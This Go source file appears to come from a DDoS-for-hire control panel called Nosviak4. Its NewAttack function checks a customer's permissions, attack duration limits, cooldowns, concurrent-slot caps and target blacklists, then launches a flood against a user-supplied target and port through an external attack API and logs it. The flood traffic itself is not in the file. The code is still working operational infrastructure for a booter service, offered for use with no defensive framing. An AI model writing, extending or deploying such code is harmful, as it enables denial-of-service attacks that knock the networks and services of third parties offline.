package attacks

import (
	"Nosviak4/source"
	"Nosviak4/source/database"
	components "Nosviak4/source/functions"
	"Nosviak4/source/masters/sessions"
	"strings"
	"time"
)

var (
	// Attacks is if attacks are enabled or disabled
	Attacks bool = true
)

// NewAttack will build the parameters and attempt to launch the attack towards the target using the direct
func NewAttack(session *sessions.Session, method *source.Method, methodName, target string, duration, port int, kvs map[string]interface{}, webhookFunc func(string, map[string]any)) error {
	if !components.CanAccessThemPermissions(session.User, method.Access...) && !database.DB.IsSuperuser(session.User) {
		return ErrUnauthorizedSender
	}

	if method.Disabled {
		return ErrMethodDisabled
	}

	// Floods are disabled
	if !Attacks {
		return ErrAttacksDisabled
	}

	// Checks with minimum duration
	if duration < method.Options.MinimumDuration {
		return ErrMinimumMaxTime
	}

	// Whenever our users maxtime is above and maxtime override is lower or equal to 0, it's enabled.
	if method.Options.MaxtimeOverride <= 0 && session.User.Maxtime > 0 && duration > session.User.Maxtime {
		return ErrMaxtimeGreaterThanSelf
	}

	// Installs the maxtime override code, whenever the override is greater than 0, it's enabled.
	if method.Options.MaxtimeOverride > 0 && duration > method.Options.MaxtimeOverride {
		return ErrMaxtimeGreaterThanOverride
	}

	// Whenever the EnhancedMaxtime is greater than 0, it's enabled
	if method.Options.EnhancedMaxtime > 0 && duration > method.Options.EnhancedMaxtime {
		return ErrMaxtimeGreaterThanEnhanced
	}

	// check their limit
	if session.User.MaxAttacks > 0 {
		attacks, err := database.DB.GetTodaysAttacks(session.User)
		if err != nil || len(attacks) >= session.User.MaxAttacks {
			return ErrMaxAttacksToday
		}
	}

	// Checks if we need to check the global overrides
	if active := source.MethodConfig.Attacks.Global; active.Enabled {
		if active.MaxTime > 0 && duration > active.MaxTime {
			return ErrGlobalMaxtime
		}

		ongoing, err := database.DB.GetOngoing()
		if err != nil {
			return err
		}

		// Checks the ongoing slots
		if active.Conns > 0 && len(ongoing) >= active.Conns {
			return ErrGlobalConns
		}

		if len(ongoing) >= 1 && active.Cooldown > 0 {
			var recent *database.Attack = ongoing[0]

			for _, attack := range ongoing[0:] {
				if attack.Created <= recent.Created {
					continue
				}

				recent = attack
				continue
			}

			// Checks if the user is inside a cooldown period
			if !method.Options.BypassCooldown && int64(recent.Created+int(active.Cooldown)) > time.Now().Unix() {
				webhookFunc("attack_cooldown_enabled", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
				return ErrGlobalCooldown
			}
		}
	}

	/* Validates the target to prevent SQL attacks on both our end and the Apis end */
	targetFunc := NewTarget(target, method)
	if ok := targetFunc.Validate(); !ok {
		return ErrInvalidTarget
	}

	if !components.CanAccessThemPermissions(session.User, source.OPTIONS.String("attacks", "powersaving_bypass_role")) {
		running, err := database.DB.GetOngoingTarget(target)
		if err != nil {
			return ErrPowersaving
		}

		// checks if it meets the threshold
		if len(running) >= source.OPTIONS.Ints("attacks", "powersaving_trigger") {
			webhookFunc("attack_powersaving_enabled", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
			return ErrPowersaving
		}
	}

	// Checks if the target is user blacklisted or not.
	blacklist, err := database.DB.GetBlacklistedTarget(targetFunc.target)
	if err == nil && blacklist != nil && !components.CanAccessThemPermissions(session.User, source.OPTIONS.Strings("bypass_blacklist")...) {
		webhookFunc("attack_target_blacklisted", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
		return ErrUserBlacklisted
	}

	// whenever the target is system blacklisted and cannot bypass it
	if targetFunc.Blacklisted() && !components.CanAccessThemPermissions(session.User, source.OPTIONS.Strings("bypass_blacklist")...) {
		webhookFunc("attack_target_blacklisted", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
		return ErrSystemBlacklisted
	}

	// Checks the method group conn slots and if they can send a flood
	if GroupConfig, ok := source.MethodConfig.FindGroup(method.Options.MethodGroup); ok && GroupConfig != nil {
		ongoing, err := database.DB.GetOngoingGroup(method.Options.MethodGroup)
		if err != nil {
			return err
		}

		if GroupConfig.Conns > 0 && len(ongoing) >= GroupConfig.Conns {
			return ErrGroupConcurrentLimitReached
		}

		if len(ongoing) >= 1 && GroupConfig.Cooldown > 0 {
			var recent *database.Attack = ongoing[0]
			for _, attack := range ongoing[0:] {
				if attack.Created <= recent.Created {
					continue
				}

				recent = attack
			}

			if !method.Options.BypassCooldown && int64(recent.Created+int(GroupConfig.Cooldown)) > time.Now().Unix() {
				webhookFunc("attack_cooldown_enabled", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
				return ErrGroupCooldown
			}
		}
	}

	if method.Options.OngoingCap >= 1 {
		ongoing, err := database.DB.GetOngoingMethod(methodName)
		if err != nil || len(ongoing) >= method.Options.OngoingCap {
			return ErrOngoingMethodCap
		}
	}

	Attacking, err := database.DB.GetOngoingUser(session.User)
	if err != nil {
		return err
	}

	// Whenever the user has more than their allowed limit of running attacks ongoing
	if session.User.Conns > 0 && len(Attacking) >= session.User.Conns {
		webhookFunc("attack_max_conns", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
		return ErrConcurrentLimitReached
	}

	// Checks for any ongoing attacks for the user, and then further checks their cooldown
	if len(Attacking) >= 1 {
		var recent *database.Attack = Attacking[0]

		for _, attack := range Attacking {
			if attack.Created <= recent.Created {
				continue
			}

			recent = attack
			continue
		}

		// Checks if the user is inside a cooldown period
		if !method.Options.BypassCooldown && session.User.Cooldown > 0 && int64(recent.Created+int(session.User.Cooldown)) > time.Now().Unix() {
			webhookFunc("attack_cooldown_enabled", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
			return ErrCooldownPeriodEngaged
		}
	}

	attacks := &database.Attack{
		User:     session.User.ID,
		Group:    method.Options.MethodGroup,
		Method:   methodName,
		Target:   target,
		Resolved: strings.Join(targetFunc.HostStrings(), ","),
		Port:     port,
		Duration: duration,
		Created:  int(time.Now().Unix()),
	}

	if err := attacks.LaunchAPI(session.User, kvs); err != nil {
		webhookFunc("attack_failed", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})
		return err
	}

	webhookFunc("attack_sent", map[string]any{"user": session.User.User(), "target": target, "method": methodName, "duration": duration, "port": port})

	// Completes the query inside the database
	return database.DB.NewAttack(attacks)
}